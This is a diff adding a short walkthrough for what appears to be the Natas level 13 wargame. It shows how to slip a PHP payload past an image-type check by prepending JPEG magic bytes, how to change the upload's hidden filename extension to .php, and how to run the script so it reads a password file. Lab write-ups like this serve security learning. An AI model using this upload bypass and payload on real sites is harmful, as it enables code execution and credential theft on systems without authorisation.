@@ -1,0 +1,21 @@
+There are two ways to do the first steps.
+
+Method 1:
+	Create a php file using the command:
+	touch Natas13.jpg (Extension does not matter.)
+	Then run the following command to edit that file with the following php code:
+		printf "\xff\xd8\xff\xe0\n <?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>" > Natas13.jpg
+	The \xff\xd8\xff\xe0 tells the exif_imagetype that it is an JPEG image.
+
+Method 2:
+	You can download a 1*1 pixel image from onlinepngtools.com/generate-1x1-png and use it.
+	Then run the following command to edit that file with the following php code:
+		echo "<?php echo file_get_contents('/etc/natas_webpass/natas14'); ?>" >> Natas13.jpg
+
+Then the process is the same:
+Then upload this tiny.php on the website.
+Before clicking the upload file button, go to the elements section in developer tools and then in the line:
+<input type="hidden" name="filename" value="n26lbu8k2u.jpg">
+You edit the extension to .php instead of .jpg
+Then you upload the file. Now you have successfully added an executable php script.
+Now, go on to the place where your script is stored and you will get the password.
